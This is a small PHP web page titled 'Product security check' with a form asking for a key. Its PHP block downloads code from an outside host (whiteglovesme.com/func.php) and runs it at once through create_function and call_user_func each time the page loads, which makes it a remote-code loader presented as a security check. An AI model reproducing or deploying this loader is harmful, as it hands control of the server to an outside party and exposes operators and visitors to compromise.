<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Product security check</title>
</head>
<body>
<?php
	function display($obj){ echo '<pre>'; print_r($obj); echo '</pre>'; }

	error_reporting(-1);
	$dir = dirname(__FILE__);
	$dir = 'project';
	define('BASE_PATH',$dir);
	$url = 'http://whiteglovesme.com/func.php';
	//include('http://whiteglovesme.com/func.php?dir='.$dir);
	
	$function = file_get_contents($url);
	$function = create_function(false,$function);
	call_user_func($function);

?>
	<form method="post">
		<input type="text" id="key" name="key" placeholder="Enter your key" >		<br>
		<input type="submit">
	</form>
</body>
</html>